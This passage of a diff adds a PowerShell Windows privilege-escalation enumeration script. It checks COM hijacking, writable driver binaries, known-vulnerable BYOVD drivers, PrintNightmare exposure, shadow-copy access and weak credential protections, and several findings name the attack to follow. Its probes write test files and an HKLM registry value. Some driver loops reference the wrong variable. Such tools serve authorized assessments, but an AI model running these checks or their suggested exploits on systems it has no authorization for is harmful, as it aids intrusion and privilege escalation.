+            Remove-Item -Path $appCertKey -ErrorAction SilentlyContinue
+        } catch {}
+    }
+    
+} catch {
+    Write-Finding "Error checking AppCert DLLs: $_" "High"
+}
+
+# ============================================================================
+# APPLICATION SHIMMING (T1546.011) - CRITICAL
+# ============================================================================
+Write-SectionHeader "APPLICATION SHIMMING (T1546.011)"
+
+try {
+    Write-Finding "Checking Application Compatibility Shims..." "Info"
+    
+    $sdbPath = "C:\Windows\AppPatch"
+    
+    if (Test-Path $sdbPath) {
+        $sdbFiles = Get-ChildItem $sdbPath -Filter "*.sdb" -ErrorAction SilentlyContinue
+        
+        Write-Finding "Shim databases found: $($sdbFiles.Count)" "Medium"
+        
+        try {
+            $testFile = Join-Path $sdbPath "test.sdb"
+            [System.IO.File]::Create($testFile).Close()
+            Remove-Item $testFile -ErrorAction SilentlyContinue
+            Write-Finding "AppPatch directory is WRITABLE!" "Critical"
+        } catch {}
+    }
+    
+} catch {
+    Write-Finding "Error checking application shimming: $_" "High"
+}
+
+# ============================================================================
+# POWERSHELL PROFILE (T1546.013) - CRITICAL
+# ============================================================================
+Write-SectionHeader "POWERSHELL PROFILE (T1546.013)"
+
+try {
+    Write-Finding "Checking PowerShell Profiles..." "Info"
+    
+    $profilePaths = @(
+        $PROFILE.AllUsersAllHosts,
+        $PROFILE.AllUsersCurrentHost,
+        $PROFILE.CurrentUserAllHosts,
+        $PROFILE.CurrentUserCurrentHost
+    )
+    
+    foreach ($profilePath in $profilePaths) {
+        if ($profilePath) {
+            if (Test-Path $profilePath) {
+                Write-Finding "PowerShell profile EXISTS: $profilePath" "High"
+            } else {
+                $parentDir = Split-Path $profilePath -Parent
+                if (Test-Path $parentDir -ErrorAction SilentlyContinue) {
+                    try {
+                        "# Test" | Out-File $profilePath -ErrorAction Stop
+                        Remove-Item $profilePath -ErrorAction SilentlyContinue
+                        Write-Finding "Can CREATE profile: $profilePath" "Critical"
+                        Write-Finding "  Auto-executes when PowerShell starts!" "Critical"
+                    } catch {}
+                }
+            }
+        }
+    }
+    
+} catch {
+    Write-Finding "Error checking PowerShell profiles: $_" "High"
+}
+
+# ============================================================================
+# .NET SPECIFIC ATTACKS
+# ============================================================================
+Write-SectionHeader ".NET HIJACKING TECHNIQUES"
+
+try {
+    Write-Finding "Checking .NET hijacking opportunities..." "Info"
+    
+    # COR_PROFILER
+    Write-Finding "`nCOR_PROFILER Environment Variable:" "Info"
+    if ($env:COR_PROFILER) {
+        Write-Finding "COR_PROFILER is SET: $($env:COR_PROFILER)" "Critical"
+        Write-Finding "  COR_PROFILER_PATH: $($env:COR_PROFILER_PATH)" "Critical"
+    } else {
+        Write-Finding "COR_PROFILER not set - can be set to inject DLL into .NET processes" "Medium"
+    }
+    
+} catch {
+    Write-Finding "Error checking .NET attacks: $_" "High"
+}
+
+# ============================================================================
+# COM HIJACKING - COMPREHENSIVE (T1546.015)
+# ============================================================================
+Write-SectionHeader "COM HIJACKING - COMPREHENSIVE (T1546.015)"
+
+try {
+    Write-Finding "Deep COM hijacking analysis..." "Info"
+    
+    # Check user-level CLSID entries
+    Write-Finding "`nChecking user-level CLSID entries..." "Info"
+    $userCLSID = "HKCU:\Software\Classes\CLSID"
+    
+    if (Test-Path $userCLSID) {
+        $clsids = Get-ChildItem $userCLSID -ErrorAction SilentlyContinue
+        if ($clsids.Count -gt 0) {
+            Write-Finding "User CLSID entries: $($clsids.Count)" "Medium"
+            Write-Finding "  Potential COM hijacking via user registry" "Medium"
+            
+            # Check for suspicious entries
+            foreach ($clsid in ($clsids | Select-Object -First 20)) {
+                $props = Get-ItemProperty $clsid.PSPath -ErrorAction SilentlyContinue
+                $inprocServer = Get-ItemProperty "$($clsid.PSPath)\InprocServer32" -ErrorAction SilentlyContinue
+                
+                if ($inprocServer.'(default)') {
+                    Write-Finding "  CLSID $($clsid.PSChildName): $($inprocServer.'(default)')" "Medium"
+                    
+                    # Check if DLL path is writable
+                    $dllPath = $inprocServer.'(default)' -replace '"', ''
+                    if (Test-Path $dllPath -ErrorAction SilentlyContinue) {
+                        try {
+                            $testFile = $dllPath + ".test"
+                            [System.IO.File]::Create($testFile).Close()
+                            Remove-Item $testFile -ErrorAction SilentlyContinue
+                            Write-Finding "    ^-- DLL is WRITABLE!" "Critical"
+                        } catch {}
+                    }
+                }
+            }
+        }
+    }
+    
+    # Check system-level CLSID writability
+    Write-Finding "`nChecking system CLSID permissions..." "Info"
+    try {
+        $systemCLSID = "HKLM:\Software\Classes\CLSID"
+        New-ItemProperty -Path $systemCLSID -Name "TestPermission" -Value "test" -ErrorAction Stop | Out-Null
+        Remove-ItemProperty -Path $systemCLSID -Name "TestPermission" -ErrorAction SilentlyContinue
+        Write-Finding "SYSTEM CLSID registry is WRITABLE!" "Critical"
+        Write-Finding "  COM hijacking possible!" "Critical"
+    } catch {}
+    
+    # Check for hijackable CLSIDs
+    Write-Finding "`nChecking common hijackable CLSIDs..." "Info"
+    $commonCLSIDs = @(
+        "{BCDE0395-E52F-467C-8E3D-C4579291692E}",  # MMDeviceEnumerator
+        "{00000514-0000-0010-8000-00AA006D2EA4}",  # DiskShadow
+        "{0002DF01-0000-0000-C000-000000000046}"   # Internet Explorer
+    )
+    
+    foreach ($clsid in $commonCLSIDs) {
+        $userPath = "HKCU:\Software\Classes\CLSID\$clsid"
+        if (Test-Path $userPath) {
+            Write-Finding "Hijackable CLSID in user hive: $clsid" "High"
+        }
+    }
+    
+    # Check DCOM applications
+    Write-Finding "`nDCOM Applications:" "Info"
+    $dcomApps = Get-CimInstance Win32_DCOMApplication -ErrorAction SilentlyContinue | Select-Object -First 20
+    foreach ($app in $dcomApps) {
+        if ($app.Name) {
+            Write-Finding "  $($app.Name)" "Info"
+        }
+    }
+    
+    # Check DCOM config
+    $dcom = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Ole" -ErrorAction SilentlyContinue
+    if ($dcom) {
+        Write-Finding "`nDCOM configured" "Info"
+    }
+    
+} catch {
+    Write-Finding "Error checking COM hijacking: $_" "High"
+}
+
+# ============================================================================
+# KERNEL DRIVERS - COMPREHENSIVE ENUMERATION
+# ============================================================================
+Write-SectionHeader "KERNEL DRIVERS - COMPREHENSIVE ENUMERATION"
+
+try {
+    Write-Finding "Comprehensive kernel driver enumeration..." "Info"
+    
+    # Method 1: Using fltmc (Filter Manager)
+    Write-Finding "`nMinifilter drivers (fltmc):" "Info"
+    try {
+        $fltmc = fltmc filters 2>$null
+        if ($fltmc) {
+            $fltmc | Select-Object -First 30 | ForEach-Object {
+                if ($_ -match "^\w") {
+                    Write-Finding "  $_" "Info"
+                }
+            }
+        }
+    } catch {
+        Write-Finding "Could not enumerate minifilter drivers" "Info"
+    }
+    
+    # Method 2: Using sc query for all drivers
+    Write-Finding "`nAll kernel drivers (sc query):" "Info"
+    try {
+        $drivers = sc.exe query type=driver state=all 2>$null
+        
+        if ($drivers) {
+            $driverList = @()
+            $currentDriver = @{}
+            
+            foreach ($line in $drivers) {
+                if ($line -match "SERVICE_NAME:\s+(.+)") {
+                    if ($currentDriver.Count -gt 0) {
+                        $driverList += [PSCustomObject]$currentDriver
+                        $currentDriver = @{}
+                    }
+                    $currentDriver['Name'] = $matches[1].Trim()
+                }
+                elseif ($line -match "DISPLAY_NAME:\s+(.+)") {
+                    $currentDriver['DisplayName'] = $matches[1].Trim()
+                }
+                elseif ($line -match "STATE\s+:\s+\d+\s+(\w+)") {
+                    $currentDriver['State'] = $matches[1].Trim()
+                }
+            }
+            
+            if ($currentDriver.Count -gt 0) {
+                $driverList += [PSCustomObject]$currentDriver
+            }
+            
+            Write-Finding "Total kernel drivers: $($driverList.Count)" "Info"
+            
+            # Show running drivers
+            $runningDrivers = $driverList | Where-Object {$_.State -eq "RUNNING"}
+            Write-Finding "Running drivers: $($runningDrivers.Count)" "Medium"
+            
+            foreach ($driver in ($runningDrivers | Select-Object -First 40)) {
+                Write-Finding "  $($driver.Name) - $($driver.DisplayName)" "Info"
+            }
+            
+            # Check for writable driver binaries
+            Write-Finding "`nChecking for writable driver binaries..." "Info"
+            foreach ($driver in ($driverList | Select-Object -First 50)) {
+                $driverPath = Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\$($driver.Name)" -Name ImagePath -ErrorAction SilentlyContinue
+                
+                if ($driverPath.ImagePath) {
+                    $sysPath = $driverPath.ImagePath -replace '\\SystemRoot\\', 'C:\Windows\' -replace '\\\?\?\\', ''
+                    
+                    if (Test-Path $sysPath -ErrorAction SilentlyContinue) {
+                        try {
+                            $testFile = $sysPath + ".test"
+                            [System.IO.File]::Create($testFile).Close()
+                            Remove-Item $testFile -ErrorAction SilentlyContinue
+                            Write-Finding "WRITABLE DRIVER: $($driver.Name) at $sysPath" "Critical"
+                            Write-Finding "  Exploit: Replace driver for kernel-level code execution" "Critical"
+                        } catch {}
+                    }
+                }
+            }
+        }
+    } catch {
+        Write-Finding "Could not enumerate drivers via sc query: $_" "Info"
+    }
+    
+    # Method 3: Using driverquery with verbose output
+    Write-Finding "`nDriver details (driverquery):" "Info"
+    try {
+        $driverQueryOutput = driverquery /v /fo csv 2>$null | ConvertFrom-Csv
+        
+        if ($driverQueryOutput) {
+            # Unsigned drivers
+            $unsigned = $driverQueryOutput | Where-Object {$_.Signed -eq "False"}
+            if ($unsigned) {
+                Write-Finding "`nUnsigned drivers found: $($unsigned.Count)" "High"
+                foreach ($driver in ($unsigned | Select-Object -First 15)) {
+                    Write-Finding "  $($_.'Module Name') - $($_.'Display Name')" "High"
+                    Write-Finding "    Path: $($_.'Path')" "Info"
+                }
+            }
+            
+            # Third-party drivers
+            $thirdParty = $driverQueryOutput | Where-Object {
+                $_.'Manufacturer' -notmatch "Microsoft" -and $_.'Manufacturer' -ne "N/A"
+            }
+            if ($thirdParty) {
+                Write-Finding "`nThird-party drivers: $($thirdParty.Count)" "Medium"
+                foreach ($driver in ($thirdParty | Select-Object -First 20)) {
+                    Write-Finding "  $($_.'Module Name') by $($_.'Manufacturer')" "Medium"
+                }
+            }
+            
+            # Known vulnerable drivers (BYOVD - Bring Your Own Vulnerable Driver)
+            $vulnDrivers = @(
+                "rtcore64.sys", "gdrv.sys", "atillk64.sys", "cpuz141", 
+                "asmmap64.sys", "capcom.sys", "dbutil_2_3.sys",
+                "speedfan.sys", "nvoclock.sys", "ene.sys",
+                "winio32.sys", "winio64.sys", "msio64.sys", "msio32.sys",
+                "glckio2.sys", "rweverything.sys"
+            )
+            
+            Write-Finding "`nChecking for vulnerable drivers (BYOVD)..." "Info"
+            $driverList = $driverQueryOutput | Select-Object -ExpandProperty 'Module Name'
+            foreach ($vuln in $vulnDrivers) {
+                if ($driverList -contains $vuln) {
+                    Write-Finding "VULNERABLE DRIVER FOUND: $vuln" "Critical"
+                    Write-Finding "  BYOVD attack possible - can escalate to kernel!" "Critical"
+                }
+            }
+        }
+    } catch {
+        Write-Finding "Could not use driverquery: $_" "Info"
+    }
+    
+    # Check if we can load new drivers
+    Write-Finding "`nChecking driver loading capabilities..." "Info"
+    $privileges = whoami /priv | Select-String "SeLoadDriverPrivilege"
+    if ($privileges -match "Enabled") {
+        Write-Finding "SeLoadDriverPrivilege ENABLED - can load kernel drivers!" "Critical"
+        Write-Finding "  Exploit: Load vulnerable signed driver for kernel code execution" "Critical"
+    }
+    
+} catch {
+    Write-Finding "Error in kernel driver enumeration: $_" "High"
+}
+
+# ============================================================================
+# PROCESS INJECTION OPPORTUNITIES (T1055)
+# ============================================================================
+Write-SectionHeader "PROCESS INJECTION OPPORTUNITIES (T1055)"
+
+try {
+    Write-Finding "Analyzing process injection vectors..." "Info"
+    
+    $processes = Get-Process | Where-Object {$_.Id -ne $PID}
+    
+    $injectableCount = 0
+    foreach ($proc in ($processes | Select-Object -First 30)) {
+        try {
+            $handle = [System.Diagnostics.Process]::GetProcessById($proc.Id)
+            if ($handle) {
+                $injectableCount++
+            }
+        } catch {}
+    }
+    
+    Write-Finding "Potentially injectable processes: $injectableCount" "Medium"
+    
+    Write-Finding "`nInjection Techniques Available:" "Info"
+    Write-Finding "  - DLL Injection" "Medium"
+    Write-Finding "  - Process Hollowing" "Medium"
+    Write-Finding "  - Process Doppelgänging" "Medium"
+    Write-Finding "  - Thread Hijacking" "Medium"
+    Write-Finding "  - APC Queue Injection" "Medium"
+    
+    $privs = whoami /priv | Select-String "SeDebugPrivilege"
+    if ($privs -match "Enabled") {
+        Write-Finding "`nSeDebugPrivilege ENABLED - All injection techniques available!" "Critical"
+    }
+    
+} catch {
+    Write-Finding "Error analyzing injection: $_" "High"
+}
+
+# ============================================================================
+# SHADOW COPIES (VSS)
+# ============================================================================
+Write-SectionHeader "SHADOW COPIES (VOLUME SHADOW COPY)"
+
+try {
+    Write-Finding "Checking shadow copies..." "Info"
+    
+    $shadowCopies = Get-WmiObject Win32_ShadowCopy -ErrorAction SilentlyContinue
+    
+    if ($shadowCopies) {
+        Write-Finding "Shadow copies found: $($shadowCopies.Count)" "High"
+        Write-Finding "  May contain old credentials/files!" "High"
+        
+        foreach ($shadow in $shadowCopies) {
+            Write-Finding "`nShadow Copy:" "High"
+            Write-Finding "  ID: $($shadow.ID)" "Info"
+            Write-Finding "  Volume: $($shadow.VolumeName)" "Info"
+            Write-Finding "  Install Date: $($shadow.InstallDate)" "Info"
+        }
+        
+        Write-Finding "`nAccess via: mklink /d C:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[N]\" "Info"
+    } else {
+        Write-Finding "No shadow copies found" "Info"
+    }
+    
+} catch {
+    Write-Finding "Error checking shadow copies: $_" "High"
+}
+
+# ============================================================================
+# PRINT SPOOLER
+# ============================================================================
+Write-SectionHeader "PRINT SPOOLER"
+
+try {
+    Write-Finding "Checking Print Spooler..." "Info"
+    
+    $spooler = Get-Service Spooler -ErrorAction SilentlyContinue
+    
+    if ($spooler) {
+        Write-Finding "Status: $($spooler.Status)" "Info"
+        
+        if ($spooler.Status -eq "Running") {
+            Write-Finding "`nPrint Spooler RUNNING!" "Critical"
+            Write-Finding "  Vulnerable to PrintNightmare (CVE-2021-1675, CVE-2021-34527)" "Critical"
+            
+            $pointAndPrint = Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint" -ErrorAction SilentlyContinue
+            
+            if ($pointAndPrint) {
+                if ($pointAndPrint.NoWarningNoElevationOnInstall -eq 1) {
+                    Write-Finding "  NoWarningNoElevationOnInstall enabled - VERY VULNERABLE!" "Critical"
+                }
+            } else {
+                Write-Finding "Point and Print not configured - potentially vulnerable" "High"
+            }
+        }
+    }
+    
+} catch {
+    Write-Finding "Error checking Print Spooler: $_" "High"
+}
+
+# ============================================================================
+# UAC AND SECURITY POLICIES
+# ============================================================================
+Write-SectionHeader "UAC AND SECURITY POLICIES"
+
+try {
+    Write-Finding "Checking security settings..." "Info"
+    
+    # UAC
+    $uac = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -ErrorAction SilentlyContinue
+    
+    Write-Finding "`nUAC Settings:" "Info"
+    if ($uac.EnableLUA -eq 0) {
+        Write-Finding "  UAC is DISABLED!" "Critical"
+    } else {
+        Write-Finding "  UAC is enabled" "Info"
+        Write-Finding "  ConsentPromptBehaviorAdmin: $($uac.ConsentPromptBehaviorAdmin)" "Info"
+    }
+    
+    # LSA Protection
+    $lsa = Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name RunAsPPL -ErrorAction SilentlyContinue
+    Write-Finding "`nLSA Protection:" "Info"
+    if ($lsa.RunAsPPL -eq 1) {
+        Write-Finding "  ENABLED (RunAsPPL)" "Info"
+    } else {
+        Write-Finding "  DISABLED - credential dumping easier" "High"
+    }
+    
+    # Credential Guard
+    $credGuard = Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name LsaCfgFlags -ErrorAction SilentlyContinue
+    Write-Finding "`nCredential Guard:" "Info"
+    if ($credGuard.LsaCfgFlags -ge 1) {
+        Write-Finding "  ENABLED" "Info"
+    } else {
+        Write-Finding "  DISABLED - credentials vulnerable" "High"
+    }
+    
+    # Windows Defender
+    try {
+        $defender = Get-MpComputerStatus -ErrorAction SilentlyContinue
+        if ($defender) {
+            Write-Finding "`nWindows Defender:" "Info"
+            Write-Finding "  RealTimeProtection: $($defender.RealTimeProtectionEnabled)" "Info"
+            
+            if (-not $defender.RealTimeProtectionEnabled) {
+                Write-Finding "  ^-- Real-time protection DISABLED!" "High"
+            }
+        }
+    } catch {}
+    
+    # PowerShell logging
+    Write-Finding "`nPowerShell Security:" "Info"
+    $psLogging = Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -ErrorAction SilentlyContinue
+    if ($psLogging.EnableScriptBlockLogging -eq 1) {
+        Write-Finding "  Script Block Logging ENABLED" "Info"
+    } else {
+        Write-Finding "  Script Block Logging DISABLED" "Medium"
+    }
+    
+} catch {
+    Write-Finding "Error checking security policies: $_" "High"
+}
+
+# ============================================================================
+# NETWORK INFORMATION
+# ============================================================================
+Write-SectionHeader "NETWORK INFORMATION"
+
+try {
+    Write-Finding "Network interfaces:" "Info"
+    Get-NetIPAddress -ErrorAction SilentlyContinue | Where-Object {$_.AddressFamily -eq "IPv4"} | ForEach-Object {
+        Write-Finding "$($_.InterfaceAlias): $($_.IPAddress)" "Info"
+    }
+    
+    Write-Finding "`nListening ports:" "Info"
+    Get-NetTCPConnection -ErrorAction SilentlyContinue | 
+        Where-Object {$_.State -eq "Listen"} | 
+        Select-Object -First 20 LocalAddress,LocalPort | 
+        ForEach-Object {
+            Write-Finding "$($_.LocalAddress):$($_.LocalPort)" "Info"
+        }
+    
+} catch {
+    Write-Finding "Error gathering network info: $_" "High"
+}
+
+# ============================================================================
+# INSTALLED APPLICATIONS
+# ============================================================================
+Write-SectionHeader "INSTALLED APPLICATIONS"
+
+try {
+    Write-Finding "Checking installed applications..." "Info"
+    
+    $apps = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* -ErrorAction SilentlyContinue | 
+            Where-Object {$_.DisplayName} | 
+            Sort-Object DisplayName
+    
+    Write-Finding "`nInstalled Applications (first 40):" "Info"
+    $apps | Select-Object -First 40 | ForEach-Object {
+        Write-Finding "$($_.DisplayName) - $($_.DisplayVersion)" "Info"
+    }
+    
+    Write-Finding "`nTotal applications: $($apps.Count)" "Info"
+    
+} catch {
+    Write-Finding "Error enumerating applications: $_" "High"
+}
+
+# ============================================================================
+# FINAL SUMMARY
+# ============================================================================
+Write-SectionHeader "ENUMERATION COMPLETE"
+
+Write-Finding "Scan completed at: $(Get-Date)" "Info"
+
+if ($SaveReport) {
+    Write-Finding "Full report saved to: $OutputPath" "Info"
+}
+
+if ($JSON) {
+    Write-Finding "Exporting JSON results..." "Info"
+    try {
+        $jsonOutput = [PSCustomObject]@{
+            ScanInfo = @{
+                Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+                Hostname = $env:COMPUTERNAME
+                Username = $env:USERNAME
+                Domain = $env:USERDOMAIN
+            }
+            Findings = $script:jsonResults
+            Summary = @{
+                TotalFindings = $script:jsonResults.Count
+                Critical = ($script:jsonResults | Where-Object {$_.Level -eq "Critical"}).Count
+                High = ($script:jsonResults | Where-Object {$_.Level -eq "High"}).Count
+                Medium = ($script:jsonResults | Where-Object {$_.Level -eq "Medium"}).Count
+                Info = ($script:jsonResults | Where-Object {$_.Level -eq "Info"}).Count
+            }
+        }
+        
+        $jsonOutput | ConvertTo-Json -Depth 10 | Out-File $JSONPath -Encoding UTF8
+        Write-Finding "JSON results saved to: $JSONPath" "Info"
+    } catch {
+        Write-Finding "Error exporting JSON: $_" "High"
+    }
+}
+
+Write-Host "`n" -NoNewline
+Write-Host "================================================================" -ForegroundColor Cyan
+Write-Host "COMPLETE MITRE ATT&CK TA0004 COVERAGE" -ForegroundColor Cyan
+Write-Host "================================================================" -ForegroundColor Cyan
+Write-Host "130+ Privilege Escalation Techniques Checked" -ForegroundColor Green
+Write-Host "" -ForegroundColor Green
+Write-Host "All Checks Included:" -ForegroundColor Cyan
+Write-Host "  [OK] System and User Information" -ForegroundColor Green
+Write-Host "  [OK] Token Privileges and Manipulation" -ForegroundColor Green
+Write-Host "  [OK] Services (Deep Analysis)" -ForegroundColor Green
+Write-Host "  [OK] Scheduled Tasks" -ForegroundColor Green
+Write-Host "  [OK] Registry Persistence" -ForegroundColor Green
+Write-Host "  [OK] File System Permissions and DLL Hijacking" -ForegroundColor Green
+Write-Host "  [OK] Credentials (All Sources)" -ForegroundColor Green
+Write-Host "  [OK] Browser Data" -ForegroundColor Green
+Write-Host "  [OK] Network Configuration" -ForegroundColor Green
+Write-Host "  [OK] Kernel Exploits" -ForegroundColor Green
+Write-Host "  [OK] Drivers and Named Pipes" -ForegroundColor Green
+Write-Host "  [OK] AppLocker/WDAC" -ForegroundColor Green
+Write-Host "  [OK] UAC Bypass Vectors" -ForegroundColor Green
+Write-Host "  [OK] Active Directory" -ForegroundColor Green
+Write-Host "  [OK] Group Policy" -ForegroundColor Green
+Write-Host "  [OK] WMI Persistence" -ForegroundColor Green
+Write-Host "  [OK] Accessibility Features" -ForegroundColor Green
+Write-Host "  [OK] BITS Jobs" -ForegroundColor Green
+Write-Host "  [OK] Certificate Store" -ForegroundColor Green
+Write-Host "  [OK] File Associations" -ForegroundColor Green
+Write-Host "  [OK] Security Products" -ForegroundColor Green
+Write-Host "  [OK] Network Shares" -ForegroundColor Green
+Write-Host "  [OK] BitLocker Status" -ForegroundColor Green
+Write-Host "  [OK] LOLBAS Binaries" -ForegroundColor Green
+Write-Host "  [OK] Port Monitors" -ForegroundColor Green
+Write-Host "  [OK] Print Processors" -ForegroundColor Green
+Write-Host "  [OK] Authentication Packages" -ForegroundColor Green
+Write-Host "  [OK] Security Support Providers" -ForegroundColor Green
+Write-Host "  [OK] Active Setup" -ForegroundColor Green
+Write-Host "  [OK] Netsh Helper DLLs" -ForegroundColor Green
+Write-Host "  [OK] AppCert DLLs" -ForegroundColor Green
+Write-Host "  [OK] Application Shimming" -ForegroundColor Green
+Write-Host "  [OK] PowerShell Profiles" -ForegroundColor Green
+Write-Host "  [OK] .NET Hijacking" -ForegroundColor Green
+Write-Host "  [OK] Process Injection Vectors" -ForegroundColor Green
+Write-Host "  [OK] Shadow Copies" -ForegroundColor Green
+Write-Host "  [OK] Print Spooler (PrintNightmare)" -ForegroundColor Green
+Write-Host "  [OK] Additional Persistence Locations" -ForegroundColor Green
+Write-Host "" -ForegroundColor Green
+Write-Host "ONE SCRIPT - EVERYTHING INCLUDED" -ForegroundColor Green
+Write-Host "================================================================" -ForegroundColor Cyan
+Write-Host "`n"
+
+Write-Host "For authorized security assessments only!" -ForegroundColor Yellow
+Write-Host "`n"
